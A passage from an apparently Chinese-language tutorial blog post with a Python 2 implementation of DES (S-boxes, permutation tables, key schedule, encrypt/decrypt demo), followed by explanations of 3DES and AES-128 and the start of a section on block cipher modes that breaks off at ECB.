<span class="number">3</span>, <span class="number">10</span>,  <span class="number">5</span>,  <span class="number">0</span>,</span><br><span class="line">    <span class="number">15</span>, <span class="number">12</span>,  <span class="number">8</span>,  <span class="number">2</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">1</span>,  <span class="number">7</span>,  <span class="number">5</span>, <span class="number">11</span>,  <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>,  <span class="number">0</span>,  <span class="number">6</span>, <span class="number">13</span>]</span><br><span class="line"><span class="comment">#S盒中的S2盒</span></span><br><span class="line">S2=[<span class="number">15</span>,  <span class="number">1</span>,  <span class="number">8</span>, <span class="number">14</span>,  <span class="number">6</span>, <span class="number">11</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">7</span>,  <span class="number">2</span>, <span class="number">13</span>, <span class="number">12</span>,  <span class="number">0</span>,  <span class="number">5</span>, <span class="number">10</span>,</span><br><span class="line">    <span class="number">3</span>, <span class="number">13</span>,  <span class="number">4</span>,  <span class="number">7</span>, <span class="number">15</span>,  <span class="number">2</span>,  <span class="number">8</span>, <span class="number">14</span>, <span class="number">12</span>,  <span class="number">0</span>,  <span class="number">1</span>, <span class="number">10</span>,  <span class="number">6</span>,  <span class="number">9</span>, <span class="number">11</span>,  <span class="number">5</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">14</span>,  <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>,  <span class="number">4</span>, <span class="number">13</span>,  <span class="number">1</span>,  <span class="number">5</span>,  <span class="number">8</span>, <span class="number">12</span>,  <span class="number">6</span>,  <span class="number">9</span>,  <span class="number">3</span>,  <span class="number">2</span>, <span class="number">15</span>,</span><br><span class="line">    <span class="number">13</span>,  <span class="number">8</span>, <span class="number">10</span>,  <span class="number">1</span>,  <span class="number">3</span>, <span class="number">15</span>,  <span class="number">4</span>,  <span class="number">2</span>, <span class="number">11</span>,  <span class="number">6</span>,  <span class="number">7</span>, <span class="number">12</span>,  <span class="number">0</span>,  <span class="number">5</span>, <span class="number">14</span>,  <span class="number">9</span>]</span><br><span class="line"><span class="comment">#S盒中的S3盒</span></span><br><span class="line">S3=[<span class="number">10</span>,  <span class="number">0</span>,  <span class="number">9</span>, <span class="number">14</span>,  <span class="number">6</span>,  <span class="number">3</span>, <span class="number">15</span>,  <span class="number">5</span>,  <span class="number">1</span>, <span class="number">13</span>, <span class="number">12</span>,  <span class="number">7</span>, <span class="number">11</span>,  <span class="number">4</span>,  <span class="number">2</span>,  <span class="number">8</span>,</span><br><span class="line">    <span class="number">13</span>,  <span class="number">7</span>,  <span class="number">0</span>,  <span class="number">9</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">6</span>, <span class="number">10</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">5</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">15</span>,  <span class="number">1</span>,</span><br><span class="line">    <span class="number">13</span>,  <span class="number">6</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">8</span>, <span class="number">15</span>,  <span class="number">3</span>,  <span class="number">0</span>, <span class="number">11</span>,  <span class="number">1</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>,  <span class="number">7</span>,</span><br><span class="line">    <span class="number">1</span>, <span class="number">10</span>, <span class="number">13</span>,  <span class="number">0</span>,  <span class="number">6</span>,  <span class="number">9</span>,  <span class="number">8</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">15</span>, <span class="number">14</span>,  <span class="number">3</span>, <span class="number">11</span>,  <span class="number">5</span>,  <span class="number">2</span>, <span class="number">12</span>]</span><br><span class="line"><span class="comment">#S盒中的S4盒</span></span><br><span class="line">S4=[<span class="number">7</span>, <span class="number">13</span>, <span class="number">14</span>,  <span class="number">3</span>,  <span class="number">0</span>,  <span class="number">6</span>,  <span class="number">9</span>, <span class="number">10</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>,  <span class="number">4</span>, <span class="number">15</span>,</span><br><span class="line">    <span class="number">13</span>,  <span class="number">8</span>, <span class="number">11</span>,  <span class="number">5</span>,  <span class="number">6</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">7</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>,  <span class="number">9</span>,</span><br><span class="line">    <span class="number">10</span>,  <span class="number">6</span>,  <span class="number">9</span>,  <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>,  <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>,  <span class="number">1</span>,  <span class="number">3</span>, <span class="number">14</span>,  <span class="number">5</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">4</span>,</span><br><span class="line">    <span class="number">3</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">6</span>, <span class="number">10</span>,  <span class="number">1</span>, <span class="number">13</span>,  <span class="number">8</span>,  <span class="number">9</span>,  <span class="number">4</span>,  <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>,  <span class="number">7</span>,  <span class="number">2</span>, <span class="number">14</span>]</span><br><span class="line"><span class="comment">#S盒中的S5盒</span></span><br><span class="line">S5=[<span class="number">2</span>, <span class="number">12</span>,  <span class="number">4</span>,  <span class="number">1</span>,  <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>,  <span class="number">6</span>,  <span class="number">8</span>,  <span class="number">5</span>,  <span class="number">3</span>, <span class="number">15</span>, <span class="number">13</span>,  <span class="number">0</span>, <span class="number">14</span>,  <span class="number">9</span>,</span><br><span class="line">    <span class="number">14</span>, <span class="number">11</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">4</span>,  <span class="number">7</span>, <span class="number">13</span>,  <span class="number">1</span>,  <span class="number">5</span>,  <span class="number">0</span>, <span class="number">15</span>, <span class="number">10</span>,  <span class="number">3</span>,  <span class="number">9</span>,  <span class="number">8</span>,  <span class="number">6</span>,</span><br><span class="line">    <span class="number">4</span>,  <span class="number">2</span>,  <span class="number">1</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>,  <span class="number">7</span>,  <span class="number">8</span>, <span class="number">15</span>,  <span class="number">9</span>, <span class="number">12</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">3</span>,  <span class="number">0</span>, <span class="number">14</span>,</span><br><span class="line">    <span class="number">11</span>,  <span class="number">8</span>, <span class="number">12</span>,  <span class="number">7</span>,  <span class="number">1</span>, <span class="number">14</span>,  <span class="number">2</span>, <span class="number">13</span>,  <span class="number">6</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">9</span>, <span class="number">10</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">3</span>]</span><br><span class="line"><span class="comment">#S盒中的S6盒</span></span><br><span class="line">S6=[<span class="number">12</span>,  <span class="number">1</span>, <span class="number">10</span>, <span class="number">15</span>,  <span class="number">9</span>,  <span class="number">2</span>,  <span class="number">6</span>,  <span class="number">8</span>,  <span class="number">0</span>, <span class="number">13</span>,  <span class="number">3</span>,  <span class="number">4</span>, <span class="number">14</span>,  <span class="number">7</span>,  <span class="number">5</span>, <span class="number">11</span>,</span><br><span class="line">    <span class="number">10</span>, <span class="number">15</span>,  <span class="number">4</span>,  <span class="number">2</span>,  <span class="number">7</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">1</span>, <span class="number">13</span>, <span class="number">14</span>,  <span class="number">0</span>, <span class="number">11</span>,  <span class="number">3</span>,  <span class="number">8</span>,</span><br><span class="line">    <span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>,  <span class="number">5</span>,  <span class="number">2</span>,  <span class="number">8</span>, <span class="number">12</span>,  <span class="number">3</span>,  <span class="number">7</span>,  <span class="number">0</span>,  <span class="number">4</span>, <span class="number">10</span>,  <span class="number">1</span>, <span class="number">13</span>, <span class="number">11</span>,  <span class="number">6</span>,</span><br><span class="line">    <span class="number">4</span>,  <span class="number">3</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">5</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>,  <span class="number">1</span>,  <span class="number">7</span>,  <span class="number">6</span>,  <span class="number">0</span>,  <span class="number">8</span>, <span class="number">13</span>]</span><br><span class="line"><span class="comment">#S盒中的S7盒</span></span><br><span class="line">S7=[<span class="number">4</span>, <span class="number">11</span>,  <span class="number">2</span>, <span class="number">14</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">8</span>, <span class="number">13</span>,  <span class="number">3</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">7</span>,  <span class="number">5</span>, <span class="number">10</span>,  <span class="number">6</span>,  <span class="number">1</span>,</span><br><span class="line">    <span class="number">13</span>,  <span class="number">0</span>, <span class="number">11</span>,  <span class="number">7</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>,  <span class="number">3</span>,  <span class="number">5</span>, <span class="number">12</span>,  <span class="number">2</span>, <span class="number">15</span>,  <span class="number">8</span>,  <span class="number">6</span>,</span><br><span class="line">    <span class="number">1</span>,  <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>,  <span class="number">3</span>,  <span class="number">7</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>,  <span class="number">6</span>,  <span class="number">8</span>,  <span class="number">0</span>,  <span class="number">5</span>,  <span class="number">9</span>,  <span class="number">2</span>,</span><br><span class="line">    <span class="number">6</span>, <span class="number">11</span>, <span class="number">13</span>,  <span class="number">8</span>,  <span class="number">1</span>,  <span class="number">4</span>, <span class="number">10</span>,  <span class="number">7</span>,  <span class="number">9</span>,  <span class="number">5</span>,  <span class="number">0</span>, <span class="number">15</span>, <span class="number">14</span>,  <span class="number">2</span>,  <span class="number">3</span>, <span class="number">12</span>]</span><br><span class="line"><span class="comment">#S盒中的S8盒</span></span><br><span class="line">S8=[<span class="number">13</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">4</span>,  <span class="number">6</span>, <span class="number">15</span>, <span class="number">11</span>,  <span class="number">1</span>, <span class="number">10</span>,  <span class="number">9</span>,  <span class="number">3</span>, <span class="number">14</span>,  <span class="number">5</span>,  <span class="number">0</span>, <span class="number">12</span>,  <span class="number">7</span>,</span><br><span class="line">    <span class="number">1</span>, <span class="number">15</span>, <span class="number">13</span>,  <span class="number">8</span>, <span class="number">10</span>,  <span class="number">3</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">12</span>,  <span class="number">5</span>,  <span class="number">6</span>, <span class="number">11</span>,  <span class="number">0</span>, <span class="number">14</span>,  <span class="number">9</span>,  <span class="number">2</span>,</span><br><span class="line">    <span class="number">7</span>, <span class="number">11</span>,  <span class="number">4</span>,  <span class="number">1</span>,  <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>,  <span class="number">2</span>,  <span class="number">0</span>,  <span class="number">6</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>,  <span class="number">3</span>,  <span class="number">5</span>,  <span class="number">8</span>,</span><br><span class="line">    <span class="number">2</span>,  <span class="number">1</span>, <span class="number">14</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">10</span>,  <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">0</span>,  <span class="number">3</span>,  <span class="number">5</span>,  <span class="number">6</span>, <span class="number">11</span>]</span><br><span class="line"><span class="comment"># S盒</span></span><br><span class="line">S=[S1,S2,S3,S4,S5,S6,S7,S8]</span><br><span class="line"><span class="comment">#P盒</span></span><br><span class="line">P_table=[<span class="number">16</span>,  <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">         <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>,</span><br><span class="line">         <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>,</span><br><span class="line">         <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>,</span><br><span class="line">         <span class="number">2</span>,  <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>,</span><br><span class="line">         <span class="number">32</span>, <span class="number">27</span>,  <span class="number">3</span>,  <span class="number">9</span>,</span><br><span class="line">         <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>,  <span class="number">6</span>,</span><br><span class="line">         <span class="number">22</span>, <span class="number">11</span>,  <span class="number">4</span>, <span class="number">25</span>]</span><br><span class="line"><span class="comment">#用于对数据进行扩展置换 32bit-&gt;48bit</span></span><br><span class="line">E_table=[<span class="number">32</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>,</span><br><span class="line">         <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>,</span><br><span class="line">         <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>,</span><br><span class="line">         <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>,</span><br><span class="line">         <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">         <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>,</span><br><span class="line">         <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>,</span><br><span class="line">         <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>,<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#按位异或函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Xor</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    temp=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        temp+=chr((ord(a[i])<span class="number">-48</span>)^(ord(b[i])<span class="number">-48</span>)+<span class="number">48</span>)</span><br><span class="line">    <span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line"><span class="comment">#置换表函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Change</span><span class="params">(a,table)</span>:</span></span><br><span class="line">    temp_R = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">        temp_R += a[i - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> temp_R</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">S_Change</span><span class="params">(m)</span>:</span></span><br><span class="line">    result=<span class="string">''</span></span><br><span class="line">    <span class="comment">#print len(m)    #48位</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(m)/<span class="number">6</span>):</span><br><span class="line">        temp_m=m[<span class="number">6</span>*i:<span class="number">6</span>*(i+<span class="number">1</span>)]</span><br><span class="line">        line=(ord(temp_m[<span class="number">0</span>])<span class="number">-48</span>)*<span class="number">2</span>+(ord(temp_m[<span class="number">5</span>])<span class="number">-48</span>)</span><br><span class="line">        ranks=(ord(temp_m[<span class="number">1</span>])<span class="number">-48</span>)*<span class="number">8</span>+(ord(temp_m[<span class="number">2</span>])<span class="number">-48</span>)*<span class="number">4</span>+(ord(temp_m[<span class="number">3</span>])<span class="number">-48</span>)*<span class="number">2</span>+(ord(temp_m[<span class="number">4</span>])<span class="number">-48</span>)</span><br><span class="line">        result+=(<span class="string">'&#123;:04b&#125;'</span>.format(S[i][line*<span class="number">16</span>+ranks]))  <span class="comment">#十进制转换为4位二进制 高位补零</span></span><br><span class="line">        <span class="comment">#print result</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成16组密钥的F函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">F</span><span class="params">(R,key)</span>:</span></span><br><span class="line">    <span class="comment">#扩展置换E</span></span><br><span class="line">    <span class="comment">#print R</span></span><br><span class="line">    R = Change(R,E_table)</span><br><span class="line">    <span class="comment">#print 'R:'+R</span></span><br><span class="line">    <span class="comment">#print 'key:'+key</span></span><br><span class="line">    temp_R=Xor(R,key)   <span class="comment">#和变换后的48bit key异或</span></span><br><span class="line">    <span class="comment">#print temp_R</span></span><br><span class="line">    temp_R=S_Change(temp_R) <span class="comment"># 八个置换盒 48bit-&gt;32bit</span></span><br><span class="line">    <span class="comment">#print len(temp_R) #32bit</span></span><br><span class="line">    temp_R=Change(temp_R,P_table)</span><br><span class="line">    <span class="keyword">return</span> temp_R</span><br><span class="line"></span><br><span class="line"><span class="comment">#PKCS7Padding:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Padding</span><span class="params">(m)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(m)%<span class="number">8</span>==<span class="number">0</span>:</span><br><span class="line">        <span class="comment"># m+='\x08'*8 #根据填充方式不同而选择</span></span><br><span class="line">        m=m</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment">#m+=unichr(8-(len(m)%8))*(8-(len(m)%8)) #填充Unicode编码数据</span></span><br><span class="line">        m+=<span class="string">'\00'</span>*(<span class="number">8</span>-(len(m)%<span class="number">8</span>))</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="comment">#16轮加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Des_decode</span><span class="params">(m,k)</span>:</span></span><br><span class="line">    <span class="comment">#print m</span></span><br><span class="line">    m=Change(m,IP_table)    <span class="comment">#IP置换</span></span><br><span class="line">    L=m[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">    R=m[<span class="number">32</span>:<span class="number">64</span>]</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    print 'L:' + L, len(L)</span></span><br><span class="line"><span class="string">    print 'R:' + R, len(R)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>):</span><br><span class="line">        Temp=R</span><br><span class="line">        R=Xor(L,F(R,k[i]))</span><br><span class="line">        L=Temp</span><br><span class="line">    temp_m=Xor(L,F(R,k[<span class="number">15</span>]))+R</span><br><span class="line">    <span class="keyword">return</span> Change(temp_m,IP_table_)</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成16轮密钥</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Create_key</span><span class="params">(k)</span>:</span></span><br><span class="line">    key = [<span class="string">''</span>] * <span class="number">16</span></span><br><span class="line">    <span class="comment"># 去校验码置换1</span></span><br><span class="line">    k=Change(k,PC_1)</span><br><span class="line">    <span class="comment">#print 'temp_k1:' + temp_k1, len(temp_k1)</span></span><br><span class="line">    <span class="comment"># 16轮密钥生成</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">17</span>):</span><br><span class="line">        C=k[<span class="number">0</span>:<span class="number">28</span>]</span><br><span class="line">        D=k[<span class="number">28</span>:<span class="number">56</span>]</span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        print 'C:'+C,len(C)</span></span><br><span class="line"><span class="string">        print 'D:'+D,len(D)</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        <span class="comment"># 循环左移</span></span><br><span class="line">        <span class="keyword">if</span> i==<span class="number">1</span> <span class="keyword">or</span> i==<span class="number">2</span> <span class="keyword">or</span> i==<span class="number">9</span> <span class="keyword">or</span> i==<span class="number">16</span> :  <span class="comment"># 1,2,9,16轮循环左移1位</span></span><br><span class="line">            C = C[<span class="number">1</span>:] + C[:<span class="number">1</span>]</span><br><span class="line">            D = D[<span class="number">1</span>:] + D[:<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">else</span>:   <span class="comment"># 其余轮数循环左移2位</span></span><br><span class="line">            C = C[<span class="number">2</span>:] + C[:<span class="number">2</span>]</span><br><span class="line">            D = D[<span class="number">2</span>:] + D[:<span class="number">2</span>]</span><br><span class="line">        k=C+D   <span class="comment"># 更新k</span></span><br><span class="line">        <span class="comment">#print len(k) #56位</span></span><br><span class="line">        <span class="comment"># 压缩置换2 生成密钥 56-&gt;48</span></span><br><span class="line">        new_k = Change(k, PC_2)</span><br><span class="line">        key[i<span class="number">-1</span>]=new_k</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    print key</span></span><br><span class="line"><span class="string">    for i in key:</span></span><br><span class="line"><span class="string">        print i</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="comment">#分组/padding/生成16组密钥</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Des</span><span class="params">(m,k)</span>:</span></span><br><span class="line">    cipher = <span class="string">''</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    print "after padding:",</span></span><br><span class="line"><span class="string">    print hex(libnum.s2n(m)),len(m)</span></span><br><span class="line"><span class="string">    print "k:"+k</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="comment">#key=Create_key(k)</span></span><br><span class="line">    <span class="comment">#print key</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(m)/<span class="number">8</span>):</span><br><span class="line">        <span class="comment">#print m[8*i:8*(i+1)],libnum.s2b(m[8*i:8*(i+1)]),len(libnum.s2b(m[8*i:8*(i+1)]))</span></span><br><span class="line">        cipher+=Des_decode(libnum.s2b(m[<span class="number">8</span>*i:<span class="number">8</span>*(i+<span class="number">1</span>)]),k)</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    while(1):</span></span><br><span class="line"><span class="string">        key = raw_input("Enter key of 8bytes:") #8位key</span></span><br><span class="line"><span class="string">        if len(key)==8:</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string">        print "error length"</span></span><br><span class="line"><span class="string">    message =raw_input("Enter message of any length:")</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    key=<span class="string">'abcdefgh'</span></span><br><span class="line">    message=<span class="string">'a'</span></span><br><span class="line"></span><br><span class="line">    message = Padding(message) <span class="comment">#padding</span></span><br><span class="line">    key = Create_key(libnum.s2b(key)) <span class="comment">#create key 字符串转二进制</span></span><br><span class="line">    <span class="keyword">print</span> binascii.b2a_hex(message)  <span class="comment"># 字符串转对应16进制ASCII码</span></span><br><span class="line"></span><br><span class="line">    cipher=Des(message,key)     <span class="comment">#加密</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"cipher二进制:"</span> + cipher</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"cipher十六进制:"</span>+hex(int(cipher, <span class="number">2</span>))[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">    key=key[::<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">if</span> hex(int(cipher, <span class="number">2</span>))[<span class="number">-1</span>]==<span class="string">'L'</span>:</span><br><span class="line">        cipher = Des(hex(int(cipher, <span class="number">2</span>))[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">'hex'</span>), key)    <span class="comment">#解密 要去掉末尾的'L'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cipher = Des(hex(int(cipher, <span class="number">2</span>))[<span class="number">2</span>:].decode(<span class="string">'hex'</span>), key)  <span class="comment"># 解密</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"message二进制:"</span> + cipher</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"message十六进制:"</span> + hex(int(cipher, <span class="number">2</span>))[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#print base64.b64encode(hex(int(cipher, 2))[2:].decode('hex') ) #二进制字符串识别成十进制</span></span><br><span class="line">    <span class="comment">#print len(cipher)</span></span><br></pre></td></tr></table></figure><h1 id="3DES"><a href="#3DES" class="headerlink" title="3DES"></a>3DES</h1><p>由于DES密码长度容易被暴力破解，所以3DES算法通过对DES算法进行改进，增加DES的密钥长度来避免类似的攻击，针对每个数据块进行三次DES加密；因此，3DES加密算法并非什么新的加密算法，是DES的一个更安全的变形，它以DES为基本模块，通过组合分组方法设计出分组加密算法。。 </p><p><strong>加/解密过程</strong><br>该算法的加解密过程分别是对明文/密文数据进行三次DES加密或解密，得到相应的密文或明文。</p><p>假设EK（）和DK（）分别表示DES的加密和解密函数，P表示明文，C表示密文，那么加解密的公式如下：<br>加密：C = EK3（ DK2（ EK1（P）） ），即对明文数据进行，加密 –&gt; 解密 –&gt; 加密的过程，最后得到密文数据；<br>解密：P = DK1（ EK2（ DK3（C）） ），即对密文数据进行，解密 –&gt; 加密 –&gt; 解密的过程，最后得到明文数据；  </p><p>其中：K1表示3DES中第一个8字节密钥，K2表示第二个8字节密钥，K3表示第三个8字节密钥，K1、K2、K3决定了算法的安全性，若三个密钥互不相同，本质上就相当于用一个长为168位的密钥进行加密。多年来，它在对付强力攻击时是比较安全的。若数据对安全性要求不那么高，K1可以等于K3。在这种情况下，密钥的有效长度为112位，即K1对应KL（左8字节），K2对应KR（右8字节），K3对应KL（左8字节）。</p><p><img src="../../images/cipher/DES/2.jpg" alt=""><br>当三重密钥均相同时，前两步相互抵消，相当于仅实现了一次加密，因此可实现对普通DES加密算法的兼容。<br><img src="../../images/cipher/DES/3.jpg" alt="">  </p><h1 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h1><p>AES为分组密码，分组密码也就是把明文分成一组一组的，每组长度相等，每次加密一组数据，直到加密完整个明文。在AES标准规范中，分组长度只能是128位，也就是说，每个分组为16个字节（每个字节8位）。密钥的长度可以使用128位、192位或256位。密钥的长度不同，推荐加密轮数也不同，如下表所示： </p><table><thead><tr><th>AES</th><th>密钥长度（32位比特字)</th><th>分组长度(32位比特字)</th><th>加密轮数</th></tr></thead><tbody><tr><td>AES-128</td><td>4</td><td>4</td><td>10</td></tr><tr><td>AES-192</td><td>6</td><td>4</td><td>12</td></tr><tr><td>AES-256</td><td>8</td><td>4</td><td>14</td></tr></tbody></table><p>轮数在下面介绍，这里实现的是AES-128，也就是密钥的长度为128位，加密轮数为10轮。<br>上面说到，AES的加密公式为C = E(K,P)，在加密函数E中，会执行一个轮函数，并且执行10次这个轮函数，这个轮函数的前9次执行的操作是一样的，只有第10次有所不同。也就是说，一个明文分组会被加密10轮。AES的核心就是实现一轮中的所有操作。</p><p>AES的处理单位是字节，128位的输入明文分组P和输入密钥K都被分成16个字节，分别记为P = P0 P1 … P15 和 K = K0 K1 … K15。如，明文分组为P = abcdefghijklmnop,其中的字符a对应P0，p对应P15。一般地，明文分组用字节为单位的正方形矩阵描述，称为状态矩阵。在算法的每一轮中，状态矩阵的内容不断发生变化，最后的结果作为密文输出。该矩阵中字节的排列顺序为从上到下、从左至右依次排列，如下图所示：<br><img src="../../images/cipher/DES/4.jpg" alt=""><br>现在假设明文分组P为”abcdefghijklmnop”，则对应上面生成的状态矩阵图如下：<br><img src="../../images/cipher/DES/5.png" alt=""><br>上图中，0x61为字符a的十六进制表示。可以看到，明文经过AES加密后，已经面目全非。</p><p>类似地，128位密钥也是用字节为单位的矩阵表示，矩阵的每一列被称为1个32位比特字。通过密钥编排函数该密钥矩阵被扩展成一个44个字组成的序列W[0],W[1], … ,W[43],该序列的前4个元素W[0],W[1],W[2],W[3]是原始密钥，用于加密运算中的初始密钥加（下面介绍）;后面40个字分为10组，每组4个字（128比特）分别用于10轮加密运算中的轮密钥加，如下图所示：<br><img src="../../images/cipher/DES/5.jpg" alt=""><br>上图中，设K = “abcdefghijklmnop”，则K0 = a, K15 = p, W[0] = K0 K1 K2 K3 = “abcd”。</p><p>AES的整体结构如下图所示，其中的W[0,3]是指W[0]、W[1]、W[2]和W[3]串联组成的128位密钥。加密的第1轮到第9轮的轮函数一样，包括4个操作：字节代换、行位移、列混合和轮密钥加。最后一轮迭代不执行列混合。另外，在第一轮迭代之前，先将明文和原始密钥进行一次异或加密操作。<br><img src="../../images/cipher/DES/6.png" alt=""><br>上图也展示了AES解密过程，解密过程仍为10轮，每一轮的操作是加密操作的逆操作。由于AES的4个轮操作都是可逆的，因此，解密操作的一轮就是顺序执行逆行移位、逆字节代换、轮密钥加和逆列混合。同加密操作类似，最后一轮不执行逆列混合，在第1轮解密之前，要执行1次密钥加操作  </p><h1 id="分组密码模式"><a href="#分组密码模式" class="headerlink" title="分组密码模式"></a>分组密码模式</h1><p>DES 和 AES 都属于分组密码，他们只能加密固定长度的明文。<br>分组加密会将明文消息划分为固定大小的块，每块明文分别在密钥控制下加密为密文。当然并不是每个消息都是相应块大小的整数倍，所以我们可能需要进行填充。   </p><h2 id="ECB"><a href="#ECB" class="headerlink" title="ECB"></a>ECB</h2><p>ECB 模式全称为电子密码本模式（Electronic 